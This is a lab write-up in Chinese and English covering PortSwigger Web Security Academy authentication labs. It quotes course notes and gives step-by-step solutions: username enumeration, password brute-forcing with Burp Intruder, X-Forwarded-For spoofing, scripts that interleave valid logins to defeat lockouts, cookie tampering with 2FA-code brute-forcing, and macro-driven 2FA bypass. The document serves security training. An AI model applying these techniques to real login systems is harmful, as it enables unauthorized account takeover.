#### Username enumeration

Username enumeration is when an attacker is able to observe changes in the website's behavior in order to identify whether a given username is valid.

Username enumeration typically occurs either on the login page, for example, when you enter a valid username but an incorrect password, or on registration forms when you enter a username that is already taken. This greatly reduces the time and effort required to brute-force a login because the attacker is able to quickly generate a shortlist of valid usernames.

While attempting to brute-force a login page, you should pay particular attention to any differences in:

- **Status codes**: During a brute-force attack, the returned HTTP status code is likely to be the same for the vast majority of guesses because most of them will be wrong. If a guess returns a different status code, this is a strong indication that the username was correct. It is best practice for websites to always return the same status code regardless of the outcome, but this practice is not always followed.
- **Error messages**: Sometimes the returned error message is different depending on whether both the username AND password are incorrect or only the password was incorrect. It is best practice for websites to use identical, generic messages in both cases, but small typing errors sometimes creep in. Just one character out of place makes the two messages distinct, even in cases where the character is not visible on the rendered page.
- **Response times**: If most of the requests were handled with a similar response time, any that deviate from this suggest that something different was happening behind the scenes. This is another indication that the guessed username might be correct. For example, a website might only check whether the password is correct if the username is valid. This extra step might cause a slight increase in the response time. This may be subtle, but an attacker can make this delay more obvious by entering an excessively long password that the website takes noticeably longer to handle.

## Lab1

### 题目

```
Lab: Username enumeration via different responses
APPRENTICE

This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

Candidate usernames
Candidate passwords
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
```

顺便给了我们用户名与密码的字典

usernames.txt：

```
carlos
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp
pi
puppet
ansible
ec2-user
vagrant
azureuser
academico
acceso
access
accounting
accounts
acid
activestat
ad
adam
adkit
admin
administracion
administrador
administrator
administrators
admins
ads
adserver
adsl
ae
af
affiliate
affiliates
afiliados
ag
agenda
agent
ai
aix
ajax
ak
akamai
al
alabama
alaska
albuquerque
alerts
alpha
alterwind
am
amarillo
americas
an
anaheim
analyzer
announce
announcements
antivirus
ao
ap
apache
apollo
app
app01
app1
apple
application
applications
apps
appserver
aq
ar
archie
arcsight
argentina
arizona
arkansas
arlington
as
as400
asia
asterix
at
athena
atlanta
atlas
att
au
auction
austin
auth
auto
autodiscover
```

passwords.txt：

```
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow
```

### 答案

先枚举用户名存活，发现提交不存在的用户名时网站会显示 `Invalid username`

<img src=".\图片\Snipaste_2023-08-03_12-58-38.png" alt="Snipaste_2023-08-03_12-58-38" style="zoom:80%;" />

bp 来枚举用户名，观察 bp 爆破包的长度，发现 `adam`  用户名存在，显示了 `Incorrect pasword`

<img src=".\图片\Snipaste_2023-08-03_13-01-59.png" alt="Snipaste_2023-08-03_13-01-59" style="zoom:80%;" />

接下来指定用户名 adam 来爆破其的密码即可

同理，观察响应的状态码和长度，密码为 `555555`

<img src=".\图片\Snipaste_2023-08-03_13-06-19.png" alt="Snipaste_2023-08-03_13-06-19" style="zoom:80%;" />

使用 `adam:555555` 登录即完成题目

## Lab2

### 题目

```
Lab: Username enumeration via subtly different responses

This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

Candidate usernames
Candidate passwords
To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
```

### 答案

这次的登录回显与上题不一样，好像无法从响应包中提示信息来分辨用户是否存在

<img src=".\图片\Snipaste_2023-08-03_13-17-26.png" alt="Snipaste_2023-08-03_13-17-26" style="zoom:80%;" />

我们还是先操作与 Lab1 中的一样，先枚举用户名，试试看看别的细节有无发现

对爆破结果再分析（提取错误的提示信息）

<img src=".\图片\Snipaste_2023-08-03_13-25-30.png" alt="Snipaste_2023-08-03_13-25-30" style="zoom:80%;" />

发现 guest 用户的响应包里的细节差别，结尾有无一个点 `.`

<img src=".\图片\Snipaste_2023-08-03_13-27-47.png" alt="Snipaste_2023-08-03_13-27-47" style="zoom:80%;" />

暂时先把 `guest` 用户当成用户名吧

接下来爆破其密码，观察响应码，有个 302 的

<img src=".\图片\Snipaste_2023-08-03_13-29-51.png" alt="Snipaste_2023-08-03_13-29-51" style="zoom:80%;" />

用户名密码为

```
guest:123456
```

## Lab3

### 题目

```
Lab: Username enumeration via response timing
PRACTITIONER

This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

Your credentials: wiener:peter
Candidate usernames
Candidate passwords
```

### 答案

这里对同一个 ip 连续爆破是有防御的，这里变化请求头里的 `X-Forwarded-For`  字段，同时枚举用户名

补充一下，爆破模块用 交叉模式 ，两个变量一起变动

<img src=".\图片\Snipaste_2023-08-03_13-57-21.png" alt="Snipaste_2023-08-03_13-57-21" style="zoom:80%;" />

观察延时情况，可能延时多点的就是正确的用户名（通过服务端查询到可能需要更多时间）。再利用该用户，爆破其密码，同时也要记得变换 ip，结果看到状态码为 302 时 就成功找到密码了，我这里失败了

## Lab4

### 前置

#### Flawed brute-force protection

It is highly likely that a brute-force attack will involve many failed guesses before the attacker successfully compromises an account. Logically, brute-force protection revolves around trying to make it as tricky as possible to automate the process and slow down the rate at which an attacker can attempt logins. The two most common ways of preventing brute-force attacks are:

- Locking the account that the remote user is trying to access if they make too many failed login attempts
- Blocking the remote user's IP address if they make too many login attempts in quick succession

Both approaches offer varying degrees of protection, but neither is invulnerable, especially if implemented using flawed logic.

For example, you might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached.

In this case, merely including your own login credentials at regular intervals throughout the wordlist is enough to render this defense virtually useless.

感觉简述下就是，次数与频率的限制

### 题目

```
Lab: Broken brute-force protection, IP block
PRACTITIONER

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

Your credentials: wiener:peter
Victim's username: carlos
Candidate passwords
```

### 答案

这时候得修改账号字典和密码字典，在两个字典中穿插写入正确的用户名和密码 即 `wiener:peter` ，还得修改 bp 爆破的线程为单线程，具体如下：

用 `notepad++` 的替换功能，或者 python 处理

用户名字典：

```python
f = open('./Testu.txt', mode='a')
for i in range(100):
     f.write("\ncarlos\nwiener")
f.close()
```

密码字典：

```python
with open('./passwords.txt') as f:
    for i in range(100):
        content = f.readline().strip()
        with open('./passwords2.txt',mode='a') as p:
            p.write(content)
            p.write('\n')
            p.write('peter')
            p.write('\n')
```

这样每两次请求之间就有一个**正确的账号密码对**，不会连续试错

爆破出来大约是这个结果：

<img src=".\图片\Snipaste_2023-08-04_14-26-37.png" alt="Snipaste_2023-08-04_14-26-37" style="zoom:80%;" />

再用筛选功能查找到 carlos 的密码

<img src=".\图片\Snipaste_2023-08-04_14-28-11.png" alt="Snipaste_2023-08-04_14-28-11" style="zoom:80%;" />

## Lab5

### 前置

通过帐户锁定枚举用户名

Account locking

One way in which websites try to prevent brute-forcing is to lock the account if certain suspicious criteria are met, usually a set number of failed login attempts. Just as with normal login errors, responses from the server indicating that an account is locked can also help an attacker to enumerate usernames.

### 题目

```
Lab: Username enumeration via account lock
PRACTITIONER

This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
```

### 答案

先枚举用户名，因为已存在的用户名连续错五次变会有不一样的提示，可以根据这个枚举用户名是否存在

观察数据包

<img src=".\图片\Snipaste_2023-08-04_14-47-25.png" alt="Snipaste_2023-08-04_14-47-25" style="zoom:80%;" />

还发现 `activestat`  用户响应里有如下提示，其它用户却没有

```
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```

大约 `activestat` 用户存在

再指定用户名爆破密码即可

<img src=".\图片\Snipaste_2023-08-04_14-51-42.png" alt="Snipaste_2023-08-04_14-51-42" style="zoom:67%;" />

看响应的长度，还可以观察响应的内容查看不同

账号密码：

```
activestat:1234567890
```

## Lab6

### 前置

Locking an account offers a certain amount of protection against targeted brute-forcing of a specific account. However, this approach fails to adequately prevent brute-force attacks in which the attacker is just trying to gain access to any random account they can.

For example, the following method can be used to work around this kind of protection:

1. Establish a list of candidate usernames that are likely to be valid. This could be through username enumeration or simply based on a list of common usernames.
2. Decide on a very small shortlist of passwords that you think at least one user is likely to have. Crucially, the number of passwords you select must not exceed the number of login attempts allowed. For example, if you have worked out that limit is 3 attempts, you need to pick a maximum of 3 password guesses.
3. Using a tool such as Burp Intruder, try each of the selected passwords with each of the candidate usernames. This way, you can attempt to brute-force every account without triggering the account lock. You only need a single user to use one of the three passwords in order to compromise an account.

Account locking also fails to protect against credential stuffing attacks. This involves using a massive dictionary of `username:password` pairs, composed of genuine login credentials stolen in data breaches. Credential stuffing relies on the fact that many people reuse the same username and password on multiple websites and, therefore, there is a chance that some of the compromised credentials in the dictionary are also valid on the target website. Account locking does not protect against credential stuffing because each username is only being attempted once. Credential stuffing is particularly dangerous because it can sometimes result in the attacker compromising many different accounts with just a single automated attack.

#### User rate limiting

Another way websites try to prevent brute-force attacks is through user rate limiting. In this case, making too many login requests within a short period of time causes your IP address to be blocked. Typically, the IP can only be unblocked in one of the following ways:

- Automatically after a certain period of time has elapsed
- Manually by an administrator
- Manually by the user after successfully completing a CAPTCHA

User rate limiting is sometimes preferred to account locking due to being less prone to username enumeration and denial of service attacks. However, it is still not completely secure. As we saw an example of in an earlier lab, there are several ways an attacker can manipulate their apparent IP in order to bypass the block.

As the limit is based on the rate of HTTP requests sent from the user's IP address, it is sometimes also possible to bypass this defense if you can work out how to guess multiple passwords with a single request.

### 题目

```
Lab: Broken brute-force protection, multiple credentials per request
EXPERT

This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

Victim's username: carlos
Candidate passwords
```

### 答案

抓包登录，发现请求时 json 格式

```http
POST /login HTTP/2
Host: 0adb00b60311322280170d4a00cc0067.web-security-academy.net
Cookie: session=jSmG7GCzQSGjXal0rmB9aXU0K0nh2dcj
Content-Length: 39
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: application/json
Accept: */*
Origin: https://0adb00b60311322280170d4a00cc0067.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0adb00b60311322280170d4a00cc0067.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

{"username":"aaaa","password":"aaaaaa"}
```

于是在 burp 的重发器里该为如下请求数据：

```
"username" : "carlos",
"password" : [
    "123456",
    "password",
    "qwerty"
    ...
]
```

python处理数据

```python
with open('./passwords.txt') as f:
    for i in range(100):
        content = f.readline().strip()
        with open('./passwords3.txt',mode='a') as p:
           p.write("\"")
           p.write(content)
           p.write("\"")
           p.write(",")
```

拦截包提交显示

<img src=".\图片\Snipaste_2023-08-04_15-15-59.png" alt="Snipaste_2023-08-04_15-15-59" style="zoom:80%;" />

## 中场补充

#### HTTP basic authentication

Although fairly old, its relative simplicity and ease of implementation means you might sometimes see HTTP basic authentication being used. In HTTP basic authentication, the client receives an authentication token from the server, which is constructed by concatenating the username and password, and encoding it in Base64. This token is stored and managed by the browser, which automatically adds it to the `Authorization` header of every subsequent request as follows:

```
Authorization: Basic base64(username:password)
```

For a number of reasons, this is generally not considered a secure authentication method. Firstly, it involves repeatedly sending the user's login credentials with every request. Unless the website also implements HSTS, user credentials are open to being captured in a man-in-the-middle attack.

In addition, implementations of HTTP basic authentication often don't support brute-force protection. As the token consists exclusively of static values, this can leave it vulnerable to being brute-forced.

HTTP basic authentication is also particularly vulnerable to session-related exploits, notably [CSRF](https://portswigger.net/web-security/csrf), against which it offers no protection on its own.

In some cases, exploiting vulnerable HTTP basic authentication might only grant an attacker access to a seemingly uninteresting page. However, in addition to providing a further attack surface, the credentials exposed in this way might be reused in other, more confidential contexts.



```
三、多因素身份验证中的漏洞
1、简述：
1、双因素身份认证实际性：验证生物特征因素对大多数网站来说是不切实际的。但是，基于以下内容的强制和可选双因素身份认证（2FA）越来越常见你知道的事以及你有的东西。这通常需要用户从他们拥有的带外物理设备输入传统密码和临时验证码。
 
2、双因素身份验证更安全：虽然攻击者有时可以获得单个基于知识的因素（如密码），但同时从带外来源获得另一个因素的可能性要小得多。因此，双因素身份验证显然比单因素身份验证更安全。然而，与任何安全措施一样，它的安全性取决于其实施情况。与单因素身份验证一样，实现不佳的双因素身份验证可以被击败，甚至完全绕过。
 
3、只是被验证两次：只有通过验证多个不同因素。以两种不同的方式验证同一因素不是真正的双因素身份验证。基于电子邮件的2FA就是这样一个例子。尽管用户必须提供密码和验证码，但访问验证码仅依赖于他们知道其电子邮件帐户的登录凭据。因此，知识认证因素只是被验证两次。 
2、双因素身份验证令牌
1、一些网站会将验证码以短信的形式发送到用户移动的上。虽然这在技术上还在验证“你所拥有的东西”的因素，但它是开放的滥用。

————

2、首先，代码是通过SMS传输的，而不是由设备本身生成的。这就产生了代码被拦截的可能性。此外，还存在交换SIM卡的风险，即攻击者通过欺诈手段获得带有受害者电话号码的SIM卡。然后，攻击者将收到发送给受害者的所有SMS消息，包括包含其验证码的消息。

————

3、绕过双因素身份验证

有时，双因素身份验证的实现存在缺陷，以至于可以完全绕过它（但是我尝试的经验，一般是前后端分离，只是前端绕过了能进去，但是没有数据）

————

如果用户首先被提示输入密码，然后被提示在单独的页面上输入验证码，则用户在输入验证码之前实际上处于“登录”状态。在这种情况下，值得测试一下，看看在完成第一个身份验证步骤后是否可以直接跳到“logged-in only”页面。有时候，您会发现网站在加载页面之前实际上并不检查您是否完成了第二步
————

涉及实验：

实验2：2FA简单旁路

3、有缺陷的双因素验证逻辑
有时，双因素身份验证中的逻辑缺陷意味着，在用户完成初始登录步骤后，网站无法充分验证同一用户是否正在完成第二步
 

示例：
1、用户在第一步中使用其普通凭据登录，如下所示
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty
 
 
2、然后，在进入登录过程的第二步之前，他们将被分配一个与其帐户相关的cookie：
HTTP/1.1 200 OK
Set-Cookie: account=carlos
 
GET /login-steps/second HTTP/1.1
Cookie: account=carlos
 
 
3、提交验证码时，请求使用此cookie来确定用户尝试访问的帐户： 
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456
 
 
 
4、在这种情况下，攻击者可以使用自己的凭据登录，然后更改cookie到任何任意用户名时提交验证码
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456

如果攻击者随后能够强制验证代码，这将是极其危险的，因为这将允许他们完全基于用户名登录到任意用户的帐户。他们甚至不需要知道用户的密码。
————

涉及实验：

实验8：2FA断开逻辑

4、暴力破解2FA验证码
 1、与密码一样，网站需要采取措施防止2FA验证码被强行使用。这一点尤其重要，因为代码通常是一个简单的4位或6位数字。如果没有足够的强力保护，破解这样的代码是微不足道的。

2、一些网站试图通过在用户输入一定数量的不正确验证码时自动注销用户来防止这种情况。这在实践中是无效的，因为高级攻击者甚至可以通过以下方式自动执行此多步骤过程创建宏。该涡轮入侵者扩展也可用于此目的
```

## Lab7

### 前置

#### Vulnerabilities in multi-factor authentication

In this section, we'll look at some of the vulnerabilities that can occur in multi-factor authentication mechanisms. We've also provided several interactive labs to demonstrate how you can exploit these vulnerabilities in multi-factor authentication.

Many websites rely exclusively on single-factor authentication using a password to authenticate users. However, some require users to prove their identity using multiple authentication factors.

Verifying biometric factors is impractical for most websites. However, it is increasingly common to see both mandatory and optional two-factor authentication (2FA) based on **something you know** and **something you have**. This usually requires users to enter both a traditional password and a temporary verification code from an out-of-band physical device in their possession.

While it is sometimes possible for an attacker to obtain a single knowledge-based factor, such as a password, being able to simultaneously obtain another factor from an out-of-band source is considerably less likely. For this reason, two-factor authentication is demonstrably more secure than single-factor authentication. However, as with any security measure, it is only ever as secure as its implementation. Poorly implemented two-factor authentication can be beaten, or even bypassed entirely, just as single-factor authentication can.

It is also worth noting that the full benefits of multi-factor authentication are only achieved by verifying multiple **different** factors. Verifying the same factor in two different ways is not true two-factor authentication. Email-based 2FA is one such example. Although the user has to provide a password and a verification code, accessing the code only relies on them knowing the login credentials for their email account. Therefore, the knowledge authentication factor is simply being verified twice.

#### Two-factor authentication tokens

Verification codes are usually read by the user from a physical device of some kind. Many high-security websites now provide users with a dedicated device for this purpose, such as the RSA token or keypad device that you might use to access your online banking or work laptop. In addition to being purpose-built for security, these dedicated devices also have the advantage of generating the verification code directly. It is also common for websites to use a dedicated mobile app, such as Google Authenticator, for the same reason.

On the other hand, some websites send verification codes to a user's mobile phone as a text message. While this is technically still verifying the factor of "something you have", it is open to abuse. Firstly, the code is being transmitted via SMS rather than being generated by the device itself. This creates the potential for the code to be intercepted. There is also a risk of SIM swapping, whereby an attacker fraudulently obtains a SIM card with the victim's phone number. The attacker would then receive all SMS messages sent to the victim, including the one containing their verification code.

#### Bypassing two-factor authentication

At times, the implementation of two-factor authentication is flawed to the point where it can be bypassed entirely.

If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code. In this case, it is worth testing to see if you can directly skip to "logged-in only" pages after completing the first authentication step. Occasionally, you will find that a website doesn't actually check whether or not you completed the second step before loading the page.

### 题目

```
Lab: 2FA simple bypass
APPRENTICE

This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

Your credentials: wiener:peter
Victim's credentials carlos:montoya
```

### 答案

这个验证是有两步的，一步是账号密码，一步是邮箱

先登录已知用户 `wiener` ，熟悉流程，一步账号密码，一步发邮箱，一步验证邮箱内容信息

<img src=".\图片\Snipaste_2023-08-04_15-45-05.png" alt="Snipaste_2023-08-04_15-45-05" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-04_15-45-11.png" alt="Snipaste_2023-08-04_15-45-11" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-08-04_15-45-18.png" alt="Snipaste_2023-08-04_15-45-18" style="zoom:80%;" />

再记录下登录后的 url

```http
https://0a6800bf04079343807d3ba400760084.web-security-academy.net/my-account?id=wiener
```

再接着登录 `carlos:montoya`  账号

到这个URL就是要验证邮箱了：

```http
https://0a6800bf04079343807d3ba400760084.web-security-academy.net/login2
```

<img src=".\图片\Snipaste_2023-08-04_15-50-13.png" alt="Snipaste_2023-08-04_15-50-13" style="zoom:80%;" />

直接将换为登陆成功的URL尝试绕过第二重邮箱验证

即后面替换为 `/my-account` ，就可以登陆成功

<img src=".\图片\Snipaste_2023-08-04_15-50-43.png" alt="Snipaste_2023-08-04_15-50-43" style="zoom:80%;" />

## Lab8

### 前置

#### Flawed two-factor verification logic

Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.

For example, the user logs in with their normal credentials in the first step as follows:

```
POST /login-steps/first HTTP/1.1 Host: vulnerable-website.com ... username=carlos&password=qwerty
```

They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:

```
HTTP/1.1 200 OK Set-Cookie: account=carlos GET /login-steps/second HTTP/1.1 Cookie: account=carlos
```

When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:

```
POST /login-steps/second HTTP/1.1 Host: vulnerable-website.com Cookie: account=carlos ... verification-code=123456
```

In this case, an attacker could log in using their own credentials but then change the value of the `account` cookie to any arbitrary username when submitting the verification code.

```
POST /login-steps/second HTTP/1.1 Host: vulnerable-website.com Cookie: account=victim-user ... verification-code=123456
```

This is extremely dangerous if the attacker is then able to brute-force the verification code as it would allow them to log in to arbitrary users' accounts based entirely on their username. They would never even need to know the user's password.

### 题目

```
Lab: 2FA broken logic
PRACTITIONER

This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

Your credentials: wiener:peter
Victim's username: carlos
You also have access to the email server to receive your 2FA verification code.
```

### 答案

#### 思路分析

第一步登录 wiener:peter 账号，观察数据包

```http
POST /login HTTP/2
Host: 0aee00c104d0f06981f568be006800cc.web-security-academy.net
Cookie: session=QK4VmzNpBdbq9nQJvMXaDQZFefwA7qup
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aee00c104d0f06981f568be006800cc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aee00c104d0f06981f568be006800cc.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

username=wiener&password=peter
```

第二步，再核对验证码，观察数据包，Cookie 字段里  `verify=wiener`

```http
POST /login2 HTTP/2
Host: 0aee00c104d0f06981f568be006800cc.web-security-academy.net
Cookie: verify=wiener; session=7x7x1YYY3tsRsty2AjUjxNqFeHjsQ6Pa
Content-Length: 13
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aee00c104d0f06981f568be006800cc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aee00c104d0f06981f568be006800cc.web-security-academy.net/login2
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

mfa-code=1613
```

加入我们把 Cookie 里的字段 换成  `verify=carlos` ，这样就可能等于直接验证完成了 carlos 第一步（即无需carlos的密码便通过了第一步验证），接下来 carlos 用户完成第二步验证时可以爆破验证码

#### 步骤

越过第一步，修改验证码爆破

```http
POST /login2 HTTP/2
Host: 0aee00c104d0f06981f568be006800cc.web-security-academy.net
Cookie: verify=carlos; session=0o826uyU8Kvtla7CGkWx1pDaAtcRhtJy
Content-Length: 10
Cache-Control: max-age=0
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aee00c104d0f06981f568be006800cc.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aee00c104d0f06981f568be006800cc.web-security-academy.net/login2
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

mfa-code=§1111§
```

爆破时注意验证码的格式

<img src=".\图片\Snipaste_2023-08-04_16-15-40.png" alt="Snipaste_2023-08-04_16-15-40" style="zoom:67%;" />

找到验证码 0039

<img src=".\图片\Snipaste_2023-08-04_16-20-33.png" alt="Snipaste_2023-08-04_16-20-33" style="zoom:67%;" />

提交，便（无需密码而爆破邮箱验证码）成功登录到 carlos 账号

## Lab9

### 前置

#### Brute-forcing 2FA verification codes

As with passwords, websites need to take steps to prevent brute-forcing of the 2FA verification code. This is especially important because the code is often a simple 4 or 6-digit number. Without adequate brute-force protection, cracking such a code is trivial.

Some websites attempt to prevent this by automatically logging a user out if they enter a certain number of incorrect verification codes. This is ineffective in practice because an advanced attacker can even automate this multi-step process by [creating macros](https://portswigger.net/burp/documentation/desktop/settings/sessions#macros) for Burp Intruder. The [Turbo Intruder](https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988) extension can also be used for this purpose.

### 题目

```
Lab: 2FA bypass using a brute-force attack
EXPERT

This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.

Victim's credentials: carlos:montoya
```

### 答案

1. With Burp running, log in as `carlos` and investigate the 2FA verification process. Notice that if you enter the wrong code twice, you will be logged out again. You need to use Burp's session handling features to log back in automatically before sending each request.

2. In Burp, go to **Project options > Sessions**. In the **Session Handling Rules** panel, click **Add**. The **Session handling rule editor** dialog opens.

3. In the dialog, go to the **Scope** tab. Under **URL Scope**, select the option **Include all URLs**.

4. Go back to the **Details** tab and under **Rule Actions**, click **Add > Run a macro**.

5. Under **Select macro** click **Add** to open the **Macro Recorder**. Select the following 3 requests:

   ```
   GET /login
   POST /login
   GET /login2
   ```

   Then click **OK**. The **Macro Editor** dialog opens.

6. Click **Test macro** and check that the final response contains the page asking you to provide the 4-digit security code. This confirms that the macro is working correctly.

7. Keep clicking **OK** to close the various dialogs until you get back to the main Burp window. The macro will now automatically log you back in as Carlos before each request is sent by Burp Intruder.

8. Send the `POST /login2` request to Burp Intruder.

9. In Burp Intruder, add a payload position to the `mfa-code` parameter.

10. On the **Payloads** tab, select the **Numbers** payload type. Enter the range 0 - 9999 and set the step to 1. Set the min/max integer digits to 4 and max fraction digits to 0. This will create a payload for every possible 4-digit integer.

11. Go to the **Resource pool** tab and add the attack to a resource pool with the **Maximum concurrent requests** set to `1`.

12. Start the attack. Eventually, one of the requests will return a 302 status code. Right-click on this request and select **Show response in browser**. Copy the URL and load it in the browser.

13. Click **My account** to solve the lab.

## 中场休息

```
四、其他身份验证机制中的漏洞
1、简述：
除了基本的登录功能外，大多数网站还提供了允许用户管理其帐户的补充功能。例如，用户通常可以更改其密码或在忘记密码时重置密码。这些机制还可能引入可被攻击者利用的漏洞。
 

网站通常会注意避免在其登录页面中出现众所周知的漏洞。但是很容易忽略这样一个事实，即需要采取类似的步骤来确保相关功能同样健壮。这在攻击者能够创建自己的帐户并因此能够轻松访问以研究这些附加页面的情况下尤为重要。 
 

2、保持用户登录
一个常见的功能是即使在关闭浏览器会话后仍保持登录状态的选项。这通常是一个简单的复选框，标记为“记住我”或“保持我的登录状态”。
 

1、破解公式：此功能通常通过生成某种“记住我”标记来实现，然后将其存储在持久性cookie中。由于拥有此cookie可以有效地让您绕过整个登录过程，因此最好不要猜测此cookie。但是，有些网站会根据可预测的静态值（如用户名和时间戳）的串联来生成此Cookie。有些甚至将密码作为cookie的一部分。如果攻击者能够创建自己的帐户，这种方法尤其危险，因为他们可以研究自己的cookie并可能推断出它是如何生成的。一旦他们计算出了公式，他们就可以尝试强行使用其他用户的cookie来访问他们的帐户。
 
2、破解加密算法：一些网站假设，如果cookie以某种方式加密，即使它使用静态值，也无法猜测。如果操作正确，这可能是真的，但是使用简单的双向编码（如Base64）天真地“加密”cookie并不能提供任何保护。即使使用正确的单向哈希函数加密也不是完全安全的。如果攻击者能够轻松地识别散列算法，并且不使用salt，那么他们可能会通过简单地散列他们的单词列表来暴力破解Cookie。如果没有对cookie猜测应用类似的限制，则可以使用此方法绕过登录尝试限制。
 
3、XSS攻击：即使攻击者无法创建自己的帐户，他们仍然可以利用此漏洞。使用常用的技术（如XSS），攻击者可以窃取另一个用户的“记住我”cookie，并从中推断出cookie是如何构造的。如果网站是使用开源框架构建的，Cookie构建的关键细节甚至可能会公开记录。
 
4、密码哈希：在极少数情况下，即使经过哈希处理，也可能从Cookie中以明文形式获得用户的实际密码。众所周知的密码列表的散列版本可以在网上找到，所以如果用户的密码出现在其中一个列表中，解密散列有时可能就像将散列粘贴到搜索引擎中一样微不足道。这证明了salt在有效加密中的重要性。 
————

涉及实验：

实验9：强制使用保持登录状态的Cookie

实验10：离线密码破解

3、重置用户密码
1、通过电子邮件发送密码

应避免通过不安全的通道发送持久口令。在这种情况下，安全性依赖于生成的密码在很短的时间内过期，或者用户立即再次更改其密码。否则，这种方法很容易受到中间人攻击。
 
电子邮件通常也不被认为是安全的，因为收件箱是永久性的，并且不是真正为机密信息的安全存储而设计的。许多用户还通过不安全的渠道在多个设备之间自动同步收件箱
2、使用URL重置密码

